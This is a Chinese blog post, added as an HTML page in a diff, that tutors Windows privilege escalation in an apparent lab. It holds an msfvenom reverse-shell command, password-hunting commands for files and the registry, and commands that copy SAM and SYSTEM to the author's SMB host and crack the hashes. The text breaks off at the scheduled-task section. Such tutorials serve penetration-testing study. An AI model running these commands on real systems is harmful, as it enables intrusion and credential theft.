@@ -1,0 +1,1547 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="浅谈windows提权, wa1ki0g,blog,github">
+    <meta name="description" content="平常用的时候总是随搜随用，今天来随便总结windows的一些提权的方式
+对比未打补丁进行提权我们可以执行systeminfo命令，把目标机器输出的结果保存为txt文件 ，并使用工具进行针对未打补丁的一个探测:
+
+利用服务漏洞提权—不安全的服">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>浅谈windows提权 | wa1ki0g‘s blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 5.4.1">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+
+   <style>
+    body{
+       background-image: url(https://s3.bmp.ovh/imgs/2021/11/89588faa2bede843.jpeg);
+       background-repeat:no-repeat;
+       background-size: 100% 100%;
+       background-attachment:fixed;
+    }
+</style>
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/0.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">wa1ki0g‘s blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/0.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">wa1ki0g‘s blog</div>
+        <div class="logo-desc">
+            
+            天行健，君子以自强不息！
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">浅谈windows提权</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" class="post-category">
+                                内网安全
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2022-07-10
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2022-11-10
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    5.9k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    22 分
+                </div>
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p>平常用的时候总是随搜随用，今天来随便总结windows的一些提权的方式</p>
+<h2 id="对比未打补丁进行提权"><a href="#对比未打补丁进行提权" class="headerlink" title="对比未打补丁进行提权"></a>对比未打补丁进行提权</h2><p><strong>我们可以执行systeminfo命令，把目标机器输出的结果保存为txt文件 ，并使用工具进行针对未打补丁的一个探测:</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/77320bac7da54645a06a92ba087e602d.png"></p>
+<h2 id="利用服务漏洞提权—不安全的服务权限"><a href="#利用服务漏洞提权—不安全的服务权限" class="headerlink" title="利用服务漏洞提权—不安全的服务权限"></a>利用服务漏洞提权—不安全的服务权限</h2><p><strong>在windows中有些服务运行时是以system权限运行的，如果这个服务的 ACL没有设置的很严格，导致我们其他用户有权更改具有系统特权的服务的配置，我们可以将服务使用的可执行项更改为我们自己的服务之一。</strong></p>
+<p><strong>通俗点就是说，假如有一个服务是以system权限运行的，而且我们还有启动/关闭以及修改其配置的权限，那么我们就可以将此服务运行时执行的exe文件，替换成我们的恶意exe文件。</strong></p>
+<p><strong>我们可使用accesschk.exe这个工具，来查找某个用户可修改的服务有哪些，使用方法：</strong></p>
+<pre class=" language-java"><code class="language-java">accesschk<span class="token punctuation">.</span>exe <span class="token operator">-</span>uwcqv <span class="token string">"user"</span> <span class="token operator">*</span>
+</code></pre>
+<p><strong>我们先用msf生成一个exe：</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/c573501bb85e462c80e0165805a61507.png"></p>
+<p><strong>python起个smb服务，传下文件：</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/7be92ce90ec644fd906f38d347d23e8f.png"><br><img src="https://img-blog.csdnimg.cn/543b69b299e44ade8c2d3a201076f92b.png"><br>监听端口执行下：</p>
+<p><img src="https://img-blog.csdnimg.cn/7d316167cebb45929f5a21d7dbd24cad.png"></p>
+<p>使用accesschk.exe，查当前用户可修改的服务有哪些，找到一个daclsvc：</p>
+<p><img src="https://img-blog.csdnimg.cn/024080bebffc472da744fb4337320059.png"><br>看一下它是以什么权限运行的：</p>
+<p><img src="https://img-blog.csdnimg.cn/7eb2a515decd431fb23d789df21e2f87.png"></p>
+<p><strong>是system权限，那么我们改下他的 BINARY_PATH_NAME 为我们的恶意文件：</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/b9b0de0facb84ce88abaf311880ffdc8.png"></p>
+<p><strong>监听下端口，并启动下服务：</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/4cda33963ce74208a4c82d97fcfabc43.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/65e65a4d844a426298ce5ecf919c4893.png"></p>
+<p><strong>返回了一个system权限的shell：</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/1dd7afecf6734f4e9ccead35b608c330.png"></p>
+<h2 id="利用服务漏洞提权—未引用的服务路径"><a href="#利用服务漏洞提权—未引用的服务路径" class="headerlink" title="利用服务漏洞提权—未引用的服务路径"></a>利用服务漏洞提权—未引用的服务路径</h2><p><strong>原理：</strong></p>
+<blockquote>
+<p>在 Windows 中，如果服务没有用引号括起来并且有空格，它会将空格作为中断处理，并将服务路径的其余部分作为参数传递。。当创建可执行路径包含空格且未包含在引号内的服务时，会导致称为未引用服务路径的漏洞，该漏洞允许用户获得SYSTEM权限（当受攻击的服务以SYSTEM 权限运行时）。</p>
+</blockquote>
+<p><strong>举个例子，当我们运行C:\Program Files\All Dir\wa1ki0g.exe时，表面来看，会运行SomeProgram.exe。</strong></p>
+<p><strong>但还有一种可能，就是C:\Program 可能是可执行的，”Files\All”和”Dir\wa1ki0g.exe” 是他的两个参数</strong></p>
+<p><strong>Windows 会分别尝试这两个方式，以此来验证哪个是正确的</strong></p>
+<p><strong>使用winPEAS来进行检查，找到一个服务未使用引号包裹 ，并包含了空格：</strong></p>
+<pre class=" language-java"><code class="language-java">winPEASany<span class="token punctuation">.</span>exe quiet servicesinfo
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/6b424a238af34362a26b2cd4d1ba745a.png"><br><strong>看一下它是以什么权限运行的：</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/136f477955074a7aa4e48fdd0af9fe19.png"><br>我们看下这个路径可以发现我们有三处都可以用来进行伪造，分别看一下这三处我们有没有可写的权限，可以看到有一处是有权限的：</p>
+<pre class=" language-java"><code class="language-java">C<span class="token operator">:</span>\PrivEsc\accesschk<span class="token punctuation">.</span>exe <span class="token operator">/</span>accepteula <span class="token operator">-</span>uwdq "C<span class="token operator">:</span>\Program Files\Unquoted Path Service\"
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/ddcf2766cb1c42f3b52d67b2389742c5.png"></p>
+<p><strong>我们将传的那个reverse.exe复制到此目录并将其重命名为 Common.exe并启动unquotedsvc服务：</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/7adc7eea53dc4e33b276c1a7e0dc835e.png"></p>
+<p><strong>成功返回个system权限的shell：</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/2e9dedf079b848b293b1b505498c654b.png"></p>
+<h2 id="利用服务漏洞提权—弱注册表权限"><a href="#利用服务漏洞提权—弱注册表权限" class="headerlink" title="利用服务漏洞提权—弱注册表权限"></a>利用服务漏洞提权—弱注册表权限</h2><p><strong>原理与上几个比较类似，就是通过注册表来改某个服务的配置，然后再启动服务。<br>还是老样子winPEASany检查下：</strong></p>
+<pre class=" language-java"><code class="language-java">winPEASany<span class="token punctuation">.</span>exe quiet servicesinfo
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/2a570c71d58940b3be3d8e517b59e241.png"><br><strong>发现我们好像有可以更改regsv服务的注册表权限，使用accesschk.exe 确认下：</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/c63e9b33d52b48938b47486786ac6766.png"></p>
+<p><strong>NT AUTHORITY\INTERACTIVE 代表当前用户的权限，说明我们可以进行配置,我们更改注册表覆盖 ImagePath 注册表项以指向那个 reverse.exe 恶意文件：</strong></p>
+<pre class=" language-java"><code class="language-java">reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc <span class="token operator">/</span>v ImagePath <span class="token operator">/</span>t REG_EXPAND_SZ <span class="token operator">/</span>d C<span class="token operator">:</span>\PrivEsc\reverse<span class="token punctuation">.</span>exe <span class="token operator">/</span>f
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/76bc764c09c74db383d46eb2fbd95be5.png"><br><strong>启动服务：</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/fa2d112b6e5143cab384681f242502ab.png"><br><strong>提权成功：</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/65f0355b2b3244bfbeb4876cdc8602fa.png"><br><img src="https://img-blog.csdnimg.cn/5640e15993784f8e90084dda130c6b8e.png"></p>
+<h2 id="利用服务漏洞提权—不安全的服务可执行文件"><a href="#利用服务漏洞提权—不安全的服务可执行文件" class="headerlink" title="利用服务漏洞提权—不安全的服务可执行文件"></a>利用服务漏洞提权—不安全的服务可执行文件</h2><p><strong>与上面的也都比较类似，也是通过更改服务的配置，这个的原理就是我们的服务启动的时候是伴随着一个exe文件启动的，而我们又对这个exe文件和目录有可写的权限，所以我们可以用我们的恶意文件去覆盖他的正常的文件</strong></p>
+<p><strong>还是先检测一波，找到了一个：</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/57b1c876f6b745e09215a7fdef293751.png"></p>
+<p><strong>还是以system权限运行的：</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/8e278c13878945fdb8fc8fa95e47f247.png" alt="sc qc filepermsvc"><br><strong>使用 accesschk.exe确认一遍，发现确实是我们可写的：</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/1f6946eea83b49cbb49896655449dac8.png"><br><strong>覆盖掉正常的exe文件：</strong></p>
+<pre class=" language-java"><code class="language-java">copy C<span class="token operator">:</span>\PrivEsc\reverse<span class="token punctuation">.</span>exe <span class="token string">"C:\Program Files\File Permissions Service\filepermservice.exe"</span> <span class="token operator">/</span>Y
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/d9f86579c4f446fdb06ab78a33f94ba7.png"></p>
+<p><strong>net start filepermsvc 启动服务，提权成功：</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/a0d753f003f7420e97d40f036c44bf51.png"><br><strong>但是这样做会导致这个服务的exe文件无法恢复，所以在进行攻击之前我们最好用copy命令备份下</strong></p>
+<h2 id="注册表提权-自启动"><a href="#注册表提权-自启动" class="headerlink" title="注册表提权 - 自启动"></a>注册表提权 - 自启动</h2><p><strong>原理就是有一些服务是在开机时候自动启动的，并且可以通过更改注册表去更改替换他的配置，这样导致计算机再重启的时候，就会执行我们更改后的。</strong></p>
+<p><strong>可以使用winPEAS 来检查一些我们有权限更改的自启动的程序</strong></p>
+<pre class=" language-java"><code class="language-java">winPEASany<span class="token punctuation">.</span>exe quiet applicationsinfo
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/8c7505a510994e1195e478ab5209cd21.png"><br>使用accesschk.exe确认一下：</p>
+<pre class=" language-java"><code class="language-java">accesschk<span class="token punctuation">.</span>exe <span class="token operator">/</span>accepteula <span class="token operator">-</span>wvu <span class="token string">"C:\Program Files\Autorun Program\program.exe"</span>
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/5be5eb0c0f4542ba984a6697c9379fda.png"><br>确认了C:\Program Files\Autorun Program\program.exe”自运行，可执行且可写入，使用我们的恶意文件，覆盖掉他：</p>
+<pre class=" language-java"><code class="language-java">copy C<span class="token operator">:</span>\PrivEsc\reverse<span class="token punctuation">.</span>exe <span class="token string">"C:\Program Files\Autorun Program\program.exe"</span> <span class="token operator">/</span>Y
+</code></pre>
+<p>开个监听，重启一下计算机，成功返回system：</p>
+<p><img src="https://img-blog.csdnimg.cn/9b8ad5024dc34089b04aab62624c247a.png"></p>
+<h2 id="注册表提权-AlwaysInstallElevated组策略"><a href="#注册表提权-AlwaysInstallElevated组策略" class="headerlink" title="注册表提权 - AlwaysInstallElevated组策略"></a>注册表提权 - AlwaysInstallElevated组策略</h2><p><strong>AlwaysInstallElevated是一个策略设置，当在系统中使用Windows Installer安装任何程序时，该参数允许非特权用户以system权限运行MSI文件。</strong></p>
+<p><strong>所以思路就是我们可以生成恶意的msi文件，然后将它安装执行</strong></p>
+<p><strong>前提：下面两个键的值必须为1</strong></p>
+<pre class=" language-java"><code class="language-java">HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+</code></pre>
+<p><strong>可以使用使用winPEAS进行检测AlwaysInstallElevated是否启用，如果启用，那么将允许普通用户以SYSTEM权限运行安装文件(MSI 文件是用于安装应用程序的包文件)：</strong></p>
+<pre class=" language-java"><code class="language-java">winPEASany<span class="token punctuation">.</span>exe quiet windowscreds
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/63cd8e95bf514be882f540bc5804b940.png"></p>
+<p><strong>工具找到了，手动验证一下：</strong></p>
+<pre class=" language-java"><code class="language-java">reg query  HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer  <span class="token operator">/</span>v AlwaysInstallElevated
+reg query  HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer  <span class="token operator">/</span>v AlwaysInstallElevated
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/811c49e3f57f4cabbdeeffc51ed8b512.png"></p>
+<p><strong>使用msf来创建一个恶意的msi文件：</strong></p>
+<pre class=" language-java"><code class="language-java">msfvenom <span class="token operator">-</span>p windows<span class="token operator">/</span>x64<span class="token operator">/</span>shell_reverse_tcp LHOST<span class="token operator">=</span><span class="token number">10.2</span><span class="token punctuation">.</span><span class="token number">7.109</span> LPORT<span class="token operator">=</span><span class="token number">53</span> <span class="token operator">-</span>f msi <span class="token operator">-</span>o reverse<span class="token punctuation">.</span>msi
+</code></pre>
+<p><strong>并上传到目标上安装：</strong></p>
+<pre class=" language-java"><code class="language-java">msiexec <span class="token operator">/</span>quiet <span class="token operator">/</span>qn <span class="token operator">/</span>i C<span class="token operator">:</span>\PrivEsc\reverse<span class="token punctuation">.</span>msi
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/c005923a1bf54c27bb1298b52bcb60ec.png"><br><strong>提权成功：</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/12aa0ddeb66448f2aba3dab3fbd9bd17.png"></p>
+<h2 id="密码提权-利用一些泄露的信息"><a href="#密码提权-利用一些泄露的信息" class="headerlink" title="密码提权 - 利用一些泄露的信息"></a>密码提权 - 利用一些泄露的信息</h2><p>大量程序在Windows注册表中存储配置选项，并且我们有时可能会在某些文件中找到存放的明文密码，如果找到了更高权限的用户的密码也相当于做了个提权。可以用下列命令查找：</p>
+<pre class=" language-java"><code class="language-java">findstr <span class="token operator">/</span>si password <span class="token operator">*</span><span class="token punctuation">.</span>txt
+findstr <span class="token operator">/</span>si password <span class="token operator">*</span><span class="token punctuation">.</span>xml
+findstr <span class="token operator">/</span>si password <span class="token operator">*</span><span class="token punctuation">.</span>ini
+</code></pre>
+<p>在.config配置文件中查找 pass、cred、vnc 这些敏感字符:</p>
+<pre class=" language-java"><code class="language-java">dir <span class="token operator">/</span>s <span class="token operator">*</span>pass<span class="token operator">*</span> <span class="token operator">==</span> <span class="token operator">*</span>cred<span class="token operator">*</span> <span class="token operator">==</span> <span class="token operator">*</span>vnc<span class="token operator">*</span> <span class="token operator">==</span> <span class="token operator">*</span><span class="token punctuation">.</span>config<span class="token operator">*</span>
+</code></pre>
+<p>在所有文件中查找 passwords ：</p>
+<pre class=" language-java"><code class="language-java">findstr <span class="token operator">/</span>spin <span class="token string">"password"</span> <span class="token operator">*</span><span class="token punctuation">.</span>*
+</code></pre>
+<p>一些可能存在密码信息的常用文件，它们有可能是base64编码的：</p>
+<pre class=" language-java"><code class="language-java">type c<span class="token operator">:</span>\sysprep<span class="token punctuation">.</span>inf
+type c<span class="token operator">:</span>\sysprep\sysprep<span class="token punctuation">.</span>xml
+type c<span class="token operator">:</span>\unattend<span class="token punctuation">.</span>xml
+type <span class="token operator">%</span>WINDIR<span class="token operator">%</span>\Panther\Unattend\Unattended<span class="token punctuation">.</span>xml
+type <span class="token operator">%</span>WINDIR<span class="token operator">%</span>\Panther\Unattended<span class="token punctuation">.</span>xml
+$ dir c<span class="token operator">:</span><span class="token operator">*</span>vnc<span class="token punctuation">.</span>ini <span class="token operator">/</span>s <span class="token operator">/</span>b
+dir c<span class="token operator">:</span><span class="token operator">*</span>ultravnc<span class="token punctuation">.</span>ini <span class="token operator">/</span>s <span class="token operator">/</span>b
+dir c<span class="token operator">:</span>\ <span class="token operator">/</span>s <span class="token operator">/</span>b <span class="token operator">|</span> findstr <span class="token operator">/</span>si <span class="token operator">*</span>vnc<span class="token punctuation">.</span>ini
+</code></pre>
+<p>查找注册表中的信息:</p>
+<pre class=" language-java"><code class="language-java">reg query HKLM <span class="token operator">/</span>f password <span class="token operator">/</span>t REG_SZ <span class="token operator">/</span>s
+reg query HKCU <span class="token operator">/</span>f password <span class="token operator">/</span>t REG_SZ <span class="token operator">/</span>s
+reg query <span class="token string">"HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"</span>
+reg query <span class="token string">"HKLM\SYSTEM\Current\ControlSet\Services\SNMP"</span>
+reg query <span class="token string">"HKCU\Software\SimonTatham\PuTTY\Sessions"</span>
+reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 <span class="token operator">/</span>v password
+</code></pre>
+<p>查找注册表中 password 信息:</p>
+<pre class=" language-java"><code class="language-java">reg query HKLM <span class="token operator">/</span>f password <span class="token operator">/</span>t REG_SZ <span class="token operator">/</span>s
+reg query HKCU <span class="token operator">/</span>f password <span class="token operator">/</span>t REG_SZ <span class="token operator">/</span>s
+</code></pre>
+<p>使用 meterpreter 进行信息收集:</p>
+<pre class=" language-java"><code class="language-java">post<span class="token operator">/</span>windows<span class="token operator">/</span>gather<span class="token operator">/</span>credentials<span class="token operator">/</span>gpp
+post<span class="token operator">/</span>windows<span class="token operator">/</span>gather<span class="token operator">/</span>enum_unattend
+</code></pre>
+<p>也可以使用winPEAS 检查常见密码位置：</p>
+<pre class=" language-java"><code class="language-java">winPEASany<span class="token punctuation">.</span>exe quiet filesinfo userinfo
+</code></pre>
+<p>用上述的好多种方法都能找到admin的密码,这里贴一个图：</p>
+<p><img src="https://img-blog.csdnimg.cn/368e3d1c2b42482a9dd54ec1047fe9bf.png"></p>
+<p>如上图我们找到了admin用户的密码password123，再用一些横向的工具弄个shell就好了,我这里用的smbexec：</p>
+<p><img src="https://img-blog.csdnimg.cn/265780af5463436db95510105ff07da2.png"></p>
+<h2 id="密码提权-凭据"><a href="#密码提权-凭据" class="headerlink" title="密码提权 - 凭据"></a>密码提权 - 凭据</h2><p><strong>Windows 具有runas 命令，在知道其他用户账户密码的情况下可以使用其他用户的权限运行命令。</strong></p>
+<p><strong>但是，Windows 还允许用户将其凭据保存到系统，这些保存的凭据可以使我们在没有密码的时候进行执行命令，可以类比 “在有cookie的时候不用账户密码就可以登录”。</strong></p>
+<p><strong>使用cmdkey /list可以查看：</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/bb02153450f848d2b3cd30945593714a.png"><br><strong>使用凭据执行命令：</strong></p>
+<pre class=" language-java"><code class="language-java">runas <span class="token operator">/</span>savecred <span class="token operator">/</span>user<span class="token operator">:</span>admin cmd<span class="token punctuation">.</span>exe
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/b5e8c768fd964c5ba53a9fa411f3f6d5.png"></p>
+<h2 id="密码提权-sam备份"><a href="#密码提权-sam备份" class="headerlink" title="密码提权 - sam备份"></a>密码提权 - sam备份</h2><p><strong>SAM和SYSTEM文件一般保存于C:\Windows\System32\config目录下。<br>在 Windows 运行时，文件已锁定。文件的备份可能存在于C:\Windows\RepairorC:\Windows\System32\config\RegBack directories</strong></p>
+<p><strong>可以将sam文件下载到本地，使用工具进行破解（密钥可以在SYSTEM的文件中找到。）</strong></p>
+<p><strong>使用smb将文件传送到本地：</strong></p>
+<pre class=" language-java"><code class="language-java">copy C<span class="token operator">:</span>\Windows\Repair\SAM \\<span class="token number">10.2</span><span class="token punctuation">.</span><span class="token number">7.109</span>\wa1ki0g\
+copy C<span class="token operator">:</span>\Windows\Repair\SYSTEM \\<span class="token number">10.2</span><span class="token punctuation">.</span><span class="token number">7.109</span>\wa1ki0g\
+</code></pre>
+<p><strong>用SAM 和 SYSTEM 文件转储哈希值：</strong></p>
+<pre class=" language-java"><code class="language-java">python3 pwdump<span class="token punctuation">.</span>py <span class="token operator">~</span><span class="token operator">/</span>Desktop<span class="token operator">/</span>SYSTEM <span class="token operator">~</span><span class="token operator">/</span>Desktop<span class="token operator">/</span>SAM
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/509be7c49609435c8066a929ec4a6ad1.png"></p>
+<p><strong>hashcat 破解管理员 NTLM 哈希：</strong></p>
+<pre class=" language-java"><code class="language-java">hashcat <span class="token operator">-</span>m <span class="token number">1000</span> <span class="token operator">--</span>force <span class="token operator">&lt;</span>hash<span class="token operator">></span> mima<span class="token punctuation">.</span>txt
+</code></pre>
+<p><strong>然后再使用一些横向工具进行命令执行就好</strong></p>
+<h2 id="计划任务提权"><a href="#计划任务提权" class="headerlink" title="计划任务提权"></a>计划任务提权</h2><p>这个其实就是在我们低权限的时候，会去检查windows的计划任务，看看这个计划任务的执行文件，有没有哪个文件我们有写入权限的。</p>
+<p>查看计算机上以管理权限运行的计划任务：</p>
